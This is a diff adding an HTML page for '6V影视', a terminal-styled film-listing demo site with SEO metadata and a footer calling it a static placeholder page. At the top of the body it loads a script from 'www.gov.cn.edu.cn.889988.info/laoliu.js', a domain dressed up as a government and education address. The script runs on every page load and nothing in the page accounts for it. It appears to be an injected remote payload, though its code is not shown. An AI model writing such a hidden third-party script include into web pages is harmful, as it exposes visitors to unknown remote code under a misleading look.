@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+<title>6V影视 - 六边形放映台·最新影视热链库 | 6vyingshi-h5.github.io</title>
+<meta name="description" content="6V影视（6vyingshi-h5.github.io）最新电影、热播剧集、动漫、综艺、纪录片、短剧一库热链：深炭黑+矩阵绿+六边青，六边形播放键一按就播，终端风影迷站。移动端自适应，纯静态演示站。" />
+<meta name="keywords" content="6V影视,6vyingshi-h5,6V电影,六边形影视,最新电影,热播剧集,动漫综艺,纪录片,短剧,终端风" />
+<link rel="canonical" href="https://6vyingshi-h5.github.io/" />
+<style>
+:root{
+  --bg:#0A0E0A;--bg2:#040E04;--card:#071407;--green:#00FF41;--green2:#00CC33;
+  --cyan:#22D3EE;--amber:#FFB454;--white:#E8FFE8;--gray:#6BCC6B;--dim:#2D6B2D;
+  --line:rgba(0,255,65,.28);--maxw:1180px;
+  --mono:"JetBrains Mono",ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{font-family:var(--mono);
+  background:
+    radial-gradient(120% 80% at 8% -10%,rgba(0,255,65,.16),transparent 55%),
+    radial-gradient(120% 90% at 96% 0%,rgba(34,211,238,.14),transparent 55%),
+    linear-gradient(180deg,#060906 0%,#0A0E0A 45%,#0C120C 100%);
+  color:var(--white);line-height:1.7;-webkit-font-smoothing:antialiased;overflow-x:hidden;min-height:100vh}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:var(--maxw);margin:0 auto;padding:0 16px}
+/* 扫描线 */
+body::after{content:"";position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.25;
+  background:repeating-linear-gradient(0deg,rgba(0,255,65,.05) 0 1px,transparent 1px 3px)}
+
+header.site{position:sticky;top:0;z-index:60;background:rgba(6,9,6,.86);backdrop-filter:blur(14px);border-bottom:1px solid var(--line)}
+.nav{display:flex;align-items:center;gap:12px;height:64px}
+.logo{display:flex;align-items:center;gap:10px;font-weight:900;font-size:18px;font-family:var(--mono)}
+.hex{width:38px;height:38px;clip-path:polygon(25% 5%,75% 5%,100% 50%,75% 95%,25% 95%,0 50%);
+  background:linear-gradient(135deg,var(--green),var(--cyan));display:flex;align-items:center;justify-content:center;
+  color:#021002;font-weight:900;box-shadow:0 0 18px rgba(0,255,65,.5)}
+.logo small{display:block;font-size:9px;color:var(--gray);font-weight:600;letter-spacing:.5px}
+.menu{margin-left:auto;display:flex;gap:2px}
+.menu a{padding:8px 13px;border-radius:8px;font-size:13px;font-weight:700;color:var(--gray)}
+.menu a:hover{background:rgba(0,255,65,.12);color:var(--green);text-shadow:0 0 8px rgba(0,255,65,.6)}
+.search-min{display:flex;gap:6px}
+.search-min input{width:130px;padding:8px 12px;border-radius:8px;border:1px solid var(--line);background:#050A05;outline:none;font-size:13px;color:var(--white);font-family:var(--mono)}
+.search-min button{border:0;padding:8px 14px;border-radius:8px;cursor:pointer;font-weight:800;background:var(--green);color:#021002;font-size:13px}
+.burger{display:none;margin-left:auto;border:1px solid var(--line);background:#050A05;border-radius:8px;padding:6px 10px;font-size:16px;color:var(--green)}
+
+.hero{position:relative;z-index:1;margin:22px 0 6px;border:1px solid var(--line);border-radius:26px;overflow:hidden;
+  padding:48px 32px;background:linear-gradient(120deg,rgba(7,20,7,.96),rgba(4,14,4,.85))}
+.hero::before{content:"> 6V_BOOT.exe";position:absolute;top:14px;left:20px;font-size:11px;color:var(--dim);letter-spacing:1px}
+.hero::after{content:"";position:absolute;right:-40px;top:-40px;width:220px;height:220px;
+  background:conic-gradient(from 0deg,var(--green),var(--cyan),var(--amber),var(--green));filter:blur(60px);opacity:.25}
+.badge{display:inline-block;font-size:12px;font-weight:800;color:#021002;background:var(--green);padding:5px 14px;border-radius:999px;margin-bottom:12px}
+.hero h1{font-size:32px;margin:0 0 6px}
+.hero h1 em{font-style:normal;color:var(--green);text-shadow:0 0 18px rgba(0,255,65,.5)}
+.hero p{color:#BFE9BF;font-size:14px;margin:0 0 18px}
+.bigbar{display:flex;gap:8px;max-width:680px;margin:0 auto;background:#050A05;border:1px solid var(--cyan);border-radius:10px;padding:6px 6px 6px 16px;box-shadow:0 0 22px rgba(34,211,238,.2)}
+.bigbar input{flex:1;border:0;outline:none;font-size:15px;background:transparent;color:var(--white);font-family:var(--mono)}
+.bigbar button{border:0;padding:10px 22px;border-radius:8px;background:linear-gradient(135deg,var(--green),var(--cyan));color:#021002;font-weight:900;cursor:pointer;font-family:var(--mono)}
+.chips{display:flex;gap:8px;flex-wrap:wrap;justify-content:center;margin-top:16px}
+.chips a{font-size:12px;font-weight:700;padding:6px 14px;border-radius:8px;background:rgba(34,211,238,.08);border:1px solid rgba(34,211,238,.35);color:var(--cyan)}
+.chips a:hover{background:var(--green);color:#021002;border-color:var(--green)}
+
+/* 六边频道 */
+.hexes{display:grid;grid-template-columns:repeat(6,1fr);gap:12px;position:relative;z-index:1;margin-top:18px}
+.hexc{aspect-ratio:1/1.08;clip-path:polygon(25% 5%,75% 5%,100% 50%,75% 95%,25% 95%,0 50%);
+  background:var(--card);border:1px solid var(--line);display:flex;flex-direction:column;align-items:center;justify-content:center;gap:4px;transition:.25s}
+.hexc:hover{background:#0A1A0A;box-shadow:0 0 26px rgba(0,255,65,.35);transform:translateY(-3px)}
+.hexc .ic{font-size:22px}
+.hexc h3{font-size:12px;margin:0;color:var(--green)}
+.hexc span{font-size:9px;color:var(--dim)}
+
+.section{padding:32px 0;position:relative;z-index:1}
+.sec-head{display:flex;align-items:baseline;gap:12px;margin-bottom:18px;flex-wrap:wrap;border-left:5px solid var(--green);padding-left:12px}
+.sec-head h2{font-size:20px;margin:0;font-family:var(--mono)}
+.sec-head h2::before{content:"▣ ";}
+.sec-head h2 .b{color:var(--green)}
+.sec-head span{color:var(--gray);font-size:12px}
+.more{margin-left:auto;color:var(--cyan);font-size:12px;font-weight:800}
+
+.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+.card{background:var(--card);border:1px solid var(--line);border-radius:14px;overflow:hidden;transition:.25s}
+.card:hover{transform:translateY(-4px);border-color:var(--green);box-shadow:0 16px 40px rgba(0,255,65,.22)}
+.cover{aspect-ratio:3/4;border-radius:14px 14px 0 0;position:relative;display:flex;align-items:flex-start;justify-content:space-between;padding:10px}
+.card:nth-child(1) .cover{background:linear-gradient(160deg,#022c12,#00FF41)}
+.card:nth-child(2) .cover{background:linear-gradient(160deg,#04222b,#22D3EE)}
+.card:nth-child(3) .cover{background:linear-gradient(160deg,#2a1c02,#FFB454)}
+.card:nth-child(4) .cover{background:linear-gradient(160deg,#2a0a1f,#FF5C8A)}
+.card:nth-child(5) .cover{background:linear-gradient(160deg,#1a0b3a,#9B8BFF)}
+.card:nth-child(6) .cover{background:linear-gradient(160deg,#062a30,#34D399)}
+.card:nth-child(7) .cover{background:linear-gradient(160deg,#2a0010,#E2563B)}
+.card:nth-child(8) .cover{background:linear-gradient(160deg,#101010,#7C8B4A)}
+.flag{font-size:10px;font-weight:900;padding:3px 9px;border-radius:6px;background:var(--green);color:#021002;font-family:var(--mono)}
+.flag.new{background:var(--cyan);color:#021002}
+.flag.hot{background:#FF5C8A;color:#fff}
+.flag.doc{background:#34D399;color:#04231c}
+.flag.score{background:#050A05;color:var(--green);border:1px solid var(--green)}
+.cover h4{margin:auto 0 0;color:#fff;font-size:14px;text-shadow:0 2px 10px rgba(0,0,0,.6);width:100%}
+.body{padding:12px}
+.tags{display:flex;gap:4px;flex-wrap:wrap;margin-bottom:5px}
+.tags span{font-size:10px;padding:2px 8px;border-radius:6px;background:rgba(0,255,65,.1);color:var(--gray);font-weight:600;font-family:var(--mono)}
+.body p{margin:0;font-size:11px;color:var(--gray)}
+
+.layout{display:grid;grid-template-columns:1fr 320px;gap:20px}
+.zones{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
+.zone{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:16px}
+.zone .ic{font-size:22px}
+.zone h3{font-size:14px;margin:6px 0 2px;color:var(--white)}
+.zone p{font-size:11px;color:var(--gray);margin:0}
+
+.side{background:var(--card);border:1px solid rgba(34,211,238,.35);border-radius:14px;padding:16px}
+.side h3{font-size:15px;margin:0 0 12px;color:var(--green)}
+.rk{display:flex;gap:10px;align-items:center;padding:9px 0;border-bottom:1px dashed rgba(0,255,65,.2)}
+.rk:last-child{border-bottom:0}
+.rk b{width:26px;color:var(--green);font-size:15px;font-weight:900;font-family:var(--mono)}
+.rk div{flex:1}
+.rk div h4{margin:0;font-size:13px}
+.rk div span{font-size:10px;color:var(--gray)}
+.rk em{font-style:normal;font-size:12px;font-weight:800;color:var(--amber);font-family:var(--mono)}
+
+.about{display:grid;grid-template-columns:1.3fr .7fr;gap:20px}
+.ac{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:22px}
+.ac h3{margin:0 0 10px;font-size:17px;font-family:var(--mono)}
+.ac h3::before{content:"⬡ ";}
+.ac p,.ac li{font-size:13px;color:var(--gray);line-height:1.8}
+.ac ul{padding-left:18px;margin:0}
+.stats{display:flex;gap:10px;margin-top:14px}
+.st{flex:1;text-align:center;background:#050A05;border:1px solid var(--line);border-radius:12px;padding:12px}
+.st b{display:block;font-size:18px;color:var(--green);font-family:var(--mono)}
+.st span{font-size:11px;color:var(--gray)}
+
+footer.site{border-top:1px solid var(--line);background:#060906;padding:26px 0 40px;color:var(--gray);font-size:12px;text-align:center;position:relative;z-index:1;font-family:var(--mono)}
+footer.site a{color:var(--cyan)}
+code{background:#050A05;border:1px solid var(--line);padding:2px 7px;border-radius:6px;font-size:11px}
+
+@media(max-width:980px){.layout{grid-template-columns:1fr}.zones{grid-template-columns:repeat(2,1fr)}.grid{grid-template-columns:repeat(3,1fr)}.about{grid-template-columns:1fr}.hexes{grid-template-columns:repeat(3,1fr)}}
+@media(max-width:720px){
+  .menu{display:none;position:absolute;top:64px;left:0;right:0;flex-direction:column;background:#060906;border-bottom:1px solid var(--line);padding:10px 16px}
+  .menu.open{display:flex}.burger{display:block}.search-min input{width:84px}.hero h1{font-size:23px}
+  .grid,.zones{grid-template-columns:1fr 1fr}.hexes{grid-template-columns:repeat(2,1fr)}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="site">
+  <div class="wrap nav">
+    <div class="logo">
+      <div class="hex">6V</div>
+      <div>6V影视<small>6vyingshi-h5.github.io</small></div>
+    </div>
+    <nav class="menu" id="menu">
+      <a href="#home">6边首页</a>
+      <a href="#movie">电影</a>
+      <a href="#tv">剧集</a>
+      <a href="#acg">动漫综艺</a>
+      <a href="#short">短纪</a>
+      <a href="#about">关于6V</a>
+    </nav>
+    <div class="search-min">
+      <input type="text" placeholder="镖人 / 亢奋S3 / 穿普拉达2 / 雾山五行" />
+      <button onclick="alert('演示站：搜索用 # 占位')">▶ 播放</button>
+    </div>
+    <button class="burger" id="burger">☰</button>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <section class="hero" id="home">
+    <span class="badge">⬡ 六边形放映台 · 最新影视热链库</span>
+    <h1>6V影视，<br/><em>六边键一按，好戏就开</em></h1>
+    <p>最新电影、热播剧集、动漫、综艺、纪录片、短剧——像老 6V 那样更新快、分类密、下载/在线双通道，但外壳换成终端极客风：矩阵绿跑字、六边青分区、琥珀色标元数据。</p>
+    <div class="bigbar">
+      <input type="text" placeholder="> search: 镖人 / 叶问 / 亢奋 / 穿普拉达的女王2 / 牧神记" />
+      <button onclick="alert('演示站：结果用 # 占位')">run</button>
+    </div>
+    <div class="chips">
+      <a href="#movie">最新电影</a>
+      <a href="#tv">热播剧集</a>
+      <a href="#acg">动漫综艺</a>
+      <a href="#short">纪录片</a>
+      <a href="#short">短剧</a>
+      <a href="#rank">6V热链榜</a>
+    </div>
+
+    <div class="hexes">
+      <div class="hexc"><div class="ic">🎬</div><h3>电影</h3><span>/movie</span></div>
+      <div class="hexc"><div class="ic">📺</div><h3>剧集</h3><span>/series</span></div>
+      <div class="hexc"><div class="ic">🐉</div><h3>动漫</h3><span>/anime</span></div>
+      <div class="hexc"><div class="ic">🎤</div><h3>综艺</h3><span>/variety</span></div>
+      <div class="hexc"><div class="ic">🎞️</div><h3>纪录片</h3><span>/doc</span></div>
+      <div class="hexc"><div class="ic">📱</div><h3>短剧</h3><span>/short</span></div>
+    </div>
+  </section>
+
+  <section class="section" id="movie">
+    <div class="sec-head"><h2><span class="b">最新</span>电影</h2><span>latest.movies</span><a class="more" href="#">more #</a></div>
+    <div class="grid">
+      <div class="card"><div class="cover"><span class="flag new">NEW</span><h4>镖人：风起大漠</h4></div><div class="body"><div class="tags"><span>动作</span><span>1080p</span><span>国漫改</span></div><p>唐刀、赏金、隋末大漠，新片即上链。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag">欧美</span><h4>穿普拉达的女王2</h4></div><div class="body"><div class="tags"><span>喜剧</span><span>时尚</span><span>2026</span></div><p>米兰达回来了，职场时尚喜剧续命。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag hot">HOT</span><h4>惊声尖叫7</h4></div><div class="body"><div class="tags"><span>恐怖</span><span>惊悚</span><span>BD中字</span></div><p>面具鬼又拨号，系列老粉秒懂。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag">国产</span><h4>人生暂停键</h4></div><div class="body"><div class="tags"><span>剧情</span><span>1080p</span><span>新片</span></div><p>中年重启、时间停格，文艺但不难懂。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag score">9.3</span><h4>霸王别姬</h4></div><div class="body"><div class="tags"><span>经典</span><span>修复</span><span>4K</span></div><p>一辈子一出戏，6V经典区常驻。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag">动作</span><h4>金谍行动</h4></div><div class="body"><div class="tags"><span>间谍</span><span>1080p</span><span>2026</span></div><p>双面、列车、密码本，爽片不烧脑。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag">动画</span><h4>熊出没·年年有熊</h4></div><div class="body"><div class="tags"><span>合家欢</span><span>4K</span><span>春节档</span></div><p>光头强过年，孩子笑、大人瞌睡。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag doc">纪录</span><h4>新来的小朋友</h4></div><div class="body"><div class="tags"><span>纪实</span><span>1080p</span><span>温柔</span></div><p>幼儿园开学，镜头比家长还紧张。</p></div></div>
+    </div>
+  </section>
+
+  <section class="section">
+    <div class="layout">
+      <div>
+        <div class="sec-head" id="tv"><h2><span class="b">热播</span>剧集</h2><span>hot.series</span><a class="more" href="#">more #</a></div>
+        <div class="zones">
+          <div class="zone"><div class="ic">📺</div><h3>亢奋 第三季</h3><p>高校十八禁，药、爱、霓虹与崩溃。</p></div>
+          <div class="zone"><div class="ic">📺</div><h3>雨霖铃</h3><p>展昭冒险，古装武侠新写法。</p></div>
+          <div class="zone"><div class="ic">📺</div><h3>百炼成神 第三季</h3><p>国漫长更，修真、宗门、越看越上头。</p></div>
+          <div class="zone"><div class="ic">📺</div><h3>仙逆</h3><p>王林逆修，章节像终端日志一样长。</p></div>
+          <div class="zone"><div class="ic">📺</div><h3>牧神记</h3><p>秦牧开眼，国漫暗黑神话线。</p></div>
+          <div class="zone"><div class="ic">📺</div><h3>成何体统 第二季</h3><p>竖屏短剧改长番，嘴炮比刀快。</p></div>
+        </div>
+
+        <div class="sec-head" id="acg" style="margin-top:26px"><h2><span class="b">动漫</span> / 综艺</h2><span>anime.variety</span><a class="more" href="#">more #</a></div>
+        <div class="grid">
+          <div class="card"><div class="cover"><span class="flag new">ANIME</span><h4>星辰变 七季全</h4></div><div class="body"><div class="tags"><span>修真</span><span>长更</span><span>国漫</span></div><p>秦羽一路打上天，片单补完神器。</p></div></div>
+          <div class="card"><div class="cover"><span class="flag">ANIME</span><h4>瑞克和莫蒂 第九季</h4></div><div class="body"><div class="tags"><span>美漫</span><span>脑洞</span><span>9.0</span></div><p>外星、平行宇宙、爷孙互怼。</p></div></div>
+          <div class="card"><div class="cover"><span class="flag hot">VARIETY</span><h4>乘风2026</h4></div><div class="body"><div class="tags"><span>舞台</span><span>竞演</span><span>热搜</span></div><p>姐姐们再下场，弹幕比舞台吵。</p></div></div>
+          <div class="card"><div class="cover"><span class="flag">VARIETY</span><h4>喜剧之王单口季</h4></div><div class="body"><div class="tags"><span>脱口秀</span><span>爆梗</span><span>9.1</span></div><p>开放麦、炸场、凌晨刷到天亮。</p></div></div>
+        </div>
+      </div>
+
+      <aside class="side" id="rank">
+        <h3>⬡ 6V热链榜</h3>
+        <div class="rk"><b>01</b><div><h4>镖人：风起大漠</h4><span>movie / 动作</span></div><em>NEW</em></div>
+        <div class="rk"><b>02</b><div><h4>亢奋 第三季</h4><span>series / 剧情</span></div><em>HOT</em></div>
+        <div class="rk"><b>03</b><div><h4>穿普拉达的女王2</h4><span>movie / 喜剧</span></div><em>9.0</em></div>
+        <div class="rk"><b>04</b><div><h4>仙逆</h4><span>anime / 修真</span></div><em>9.2</em></div>
+        <div class="rk"><b>05</b><div><h4>牧神记</h4><span>anime / 神话</span></div><em>9.1</em></div>
+        <div class="rk"><b>06</b><div><h4>惊声尖叫7</h4><span>movie / 恐怖</span></div><em>8.6</em></div>
+        <div class="rk"><b>07</b><div><h4>霸王别姬</h4><span>movie / 经典</span></div><em>9.3</em></div>
+        <div class="rk"><b>08</b><div><h4>乘风2026</h4><span>variety / 舞台</span></div><em>TOP</em></div>
+      </aside>
+    </div>
+  </section>
+
+  <section class="section" id="short">
+    <div class="sec-head"><h2><span class="b">纪录片</span> / 短剧</h2><span>docs.shorts</span><a class="more" href="#">more #</a></div>
+    <div class="grid">
+      <div class="card"><div class="cover"><span class="flag doc">DOC</span><h4>挪威足球队：黑马之路</h4></div><div class="body"><div class="tags"><span>体育</span><span>1080p</span><span>纪实</span></div><p>小国大队、金发前锋、逆袭编年史。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag doc">DOC</span><h4>1994美国世界杯</h4></div><div class="body"><div class="tags"><span>足球</span><span>怀旧</span><span>4K修复</span></div><p>巴乔射飞那脚，重看还是心跳。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag hot">SHORT</span><h4>成何体统</h4></div><div class="body"><div class="tags"><span>竖屏</span><span>古装</span><span>上头</span></div><p>穿越朝堂，三集一个反转。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag">SHORT</span><h4>醉后出拳·武行版</h4></div><div class="body"><div class="tags"><span>3分钟</span><span>市井</span><span>反杀</span></div><p>宵夜摊被讹，醉步锁喉收尾。</p></div></div>
+    </div>
+  </section>
+
+  <section class="section" id="about">
+    <div class="sec-head"><h2>关于 6V影视</h2><span>about.6v</span></div>
+    <div class="about">
+      <div class="ac">
+        <h3>6V影视是什么？</h3>
+        <p>6V影视（6vyingshi-h5.github.io）把老 6V 的“资源聚合 / 更新快 / 分类密 / 电影为主 / 下载+在线”翻译成极客外壳：深炭黑底、矩阵绿字、六边青分区、六边形播放键。它不像 PPS 是客户端大厅、不像醉拳满身酒气、不像午夜专守凌晨——6V 是“终端影迷站”：<code>最新50部</code>、<code>6类片库</code>、<code>6边键</code>、<code>热链榜</code>，找片像敲命令。</p>
+        <div class="stats">
+          <div class="st"><b>⬡</b><span>六边放映台</span></div>
+          <div class="st"><b>6类</b><span>片库</span></div>
+          <div class="st"><b>6栏</b><span>导航</span></div>
+          <div class="st"><b>100%</b><span>移动端</span></div>
+        </div>
+      </div>
+      <div class="ac">
+        <h3>demo.note</h3>
+        <ul>
+          <li>纯静态单页，无后端 / 无数据库</li>
+          <li>所有链接均为 <code>#</code> 占位</li>
+          <li>不提供盗版资源，与 hao6v / 6vhao 无隶属</li>
+          <li>必应收录友好：唯一 h1、canonical、description 完整</li>
+          <li>深炭黑 + 矩阵绿 + 六边青 = 六边形终端影视站</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer class="site">
+  <div class="wrap">
+    $ 6V影视 --host 6vyingshi-h5.github.io<br/>
+    演示页面：所有链接均使用 <code>#</code> 占位，不提供真实盗版资源。<br/>
+    © 2026 6V影视 Demo · 六边键一按，好戏就开 ⬡
+  </div>
+</footer>
+
+<script>
+  const b=document.getElementById('burger'),m=document.getElementById('menu');
+  b.onclick=()=>m.classList.toggle('open');
+  m.querySelectorAll('a').forEach(a=>a.onclick=()=>m.classList.remove('open'));
+  document.querySelectorAll('a[href^="#"]').forEach(a=>a.onclick=e=>{
+    const t=document.querySelector(a.getAttribute('href'));
+    if(t){e.preventDefault();t.scrollIntoView({behavior:'smooth'});}
+  });
+</script>
+</body>
+</html>
